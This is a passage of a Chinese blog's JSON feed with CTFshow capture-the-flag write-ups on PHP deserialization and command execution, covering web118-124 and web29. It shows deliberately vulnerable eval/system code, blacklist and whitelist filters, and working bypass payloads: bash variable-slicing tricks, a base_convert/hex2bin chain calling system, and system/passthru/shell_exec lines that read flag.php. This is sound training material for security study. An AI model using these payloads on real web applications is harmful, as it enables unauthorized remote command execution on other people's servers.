function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>首先将生成的 payload 前面加上一个 |, 传入 test.php 中，这时会生成一个文件，文件内容是</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">a:1:&#123;s:4:&quot;demo&quot;;s:41:&quot;|O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;demo&quot;;s:7:&quot;success&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103000411026.png\" alt=\"image-20221103000411026\" /></p>\n<p>接着访问 test2.php，看到 success 则测试成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103000506360.png\" alt=\"image-20221103000506360\" /></p>\n",
            "tags": [
                "Web",
                "反序列化"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/",
            "url": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A1%A5%E5%85%85/",
            "title": "CTFshow-web入门命令执行补充",
            "date_published": "2022-10-31T16:00:00.000Z",
            "content_html": "<h2 id=\"web118\"><a class=\"anchor\" href=\"#web118\">#</a> web118</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101124411538.png\" alt=\"image-20221101124411538\" /></p>\n<p>已经知道 flag 在 flag.php 中，想办法打开文件就行</p>\n<p>这里将小写字母和数字都过滤了，使用 bash 的内置变量进行绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101125816499.png\" alt=\"image-20221101125816499\" /></p>\n<p>题目应该在 html 下面，可以拿到 l，PATH 结尾是 /bin 拿到 n</p>\n<p>可以使用 nl 命令</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">PATH</span><span class=\"token punctuation\">:</span><span class=\"token operator\">~</span><span class=\"token constant\">A</span><span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">PWD</span><span class=\"token punctuation\">:</span><span class=\"token operator\">~</span><span class=\"token constant\">A</span><span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$IFS</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">.</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span>\n<span class=\"token comment\">//nl flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101130512076.png\" alt=\"image-20221101130512076\" /></p>\n<h2 id=\"web119\"><a class=\"anchor\" href=\"#web119\">#</a> web119</h2>\n<p>上面的 payload 用不了了，去 bin 下调用 cat 命令</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101131118761.png\" alt=\"image-20221101131118761\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;SHLVL&#125;       &#x2F;&#x2F;一般是一个个位数\n$&#123;#SHLVL&#125;     &#x2F;&#x2F;1，表示结果的字符长度\n$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;表示&#x2F;\n$&#123;USER&#125;        &#x2F;&#x2F;www-data\n$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2\n$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101131535946.png\" alt=\"image-20221101131535946\" /></p>\n<h2 id=\"web120\"><a class=\"anchor\" href=\"#web120\">#</a> web120</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\>|\\'|\\`|\\||\\,/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">65</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'you are so long , I dont like '</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/div>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">'</span><span class=\"token operator\">.</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/div>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">evil input&lt;/div>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>相当于前两关的源码给了，加了一个长度限制</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#96;$&#123;#&#125;&#96; 相当于0，可省略，构造一个a&#x3D;&#x3D;》$&#123;USER:~A&#125;\n$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;USER:~A&#125; ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132159304.png\" alt=\"image-20221101132159304\" /></p>\n<h2 id=\"web121\"><a class=\"anchor\" href=\"#web121\">#</a> web121</h2>\n<p>过滤增加了，还有一个 PWD 能用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132608193.png\" alt=\"image-20221101132608193\" /></p>\n<p>数字还是有方法构建的</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;#&#125;为添加到shell的参数个数\nrev命令将文件中的每行内容以字符为单位反序输出\n$&#123;#IFS&#125;kali里是4，乌班图是3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web124\"><a class=\"anchor\" href=\"#web124\">#</a> web124</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 听说你很喜欢数学，不知道你是否爱它胜过爱 flag</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 例子 c=20-1</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"太长了不会算\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\['</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\]'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"请不要输入奇奇怪怪的字符\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// 常用数学函数 http://www.w3school.com.cn/php/php_ref_math.asp</span>\n    <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'abs'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'acos'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'acosh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'asin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'asinh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atan2'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atanh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'base_convert'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'bindec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'ceil'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cos'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cosh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'decbin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'dechex'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'decoct'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'deg2rad'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'expm1'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'floor'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'fmod'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'getrandmax'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'hexdec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'hypot'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_finite'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_infinite'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_nan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'lcg_value'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log10'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log1p'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'max'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'min'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_getrandmax'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_rand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_srand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'octdec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'pi'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'pow'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rad2deg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'round'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sinh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sqrt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'srand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'tan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'tanh'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$used_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$used_funcs</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"请不要输入奇奇怪怪的函数\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// 帮你算出答案</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'echo '</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">题中可用于进制转换的函数\n&#39;base_convert&#39;-任意进制之间转换\n&#39;bindec&#39;-把二进制转换为十进制\n&#39;decbin&#39;-把十进制转还为二进制\n&#39;dechex&#39;-十进制转16进制\n&#39;decoct&#39;-八进制转16进制<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>想办法构造</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$_GET[a]($_GET[b]);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">[]被过滤了，可以使用&#123;&#125;代替，16进制有字母，将16进制转10进制\n想利用hex2bin()实现进制与字符串相互，也得构建一下\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_GET'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hex2bin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hex2bin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//37907361743hex2bin</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_GET'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//echo base_convert('hex2bin',36,10);</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'37907361743'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">bin2hex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_GET\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5f474554\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1598506324\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//hex2bin5f4745541598506324_GET</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>再将语句拼接一下</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'37907361743'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1598506324\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n最后的payload\n<span class=\"token operator\">/</span><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token variable\">$pi</span><span class=\"token operator\">=</span><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token number\">37907361743</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1598506324</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$$pi</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$pi</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">=</span>ls<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101152741080.png\" alt=\"image-20221101152741080\" /></p>\n",
            "tags": [
                "CTFshow",
                "rce"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "CTFshow-web入门命令执行",
            "date_published": "2022-10-31T16:00:00.000Z",
            "content_html": "<h2 id=\"web29\"><a class=\"anchor\" href=\"#web29\">#</a> web29</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-uri\" data-language=\"uri\"><code class=\"language-uri\"><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">c</span>=<span class=\"token value\">system('cat</span></span></span> f<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">ag.php')</span></span><span class=\"token pair-delimiter\">;</span></span>\n<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">c</span>=<span class=\"token value\">echo</span></span></span> `cat fla<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">.ph?</span></span></span>`;\n<span class=\"token path\">c=passthru('cat</span> fla<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">.ph?')</span></span><span class=\"token pair-delimiter\">;</span></span>\n<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">c</span>=<span class=\"token value\">echo</span></span></span> shell_exec('cat f*');<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026153914690.png\" alt=\"image-20221026153914690\" 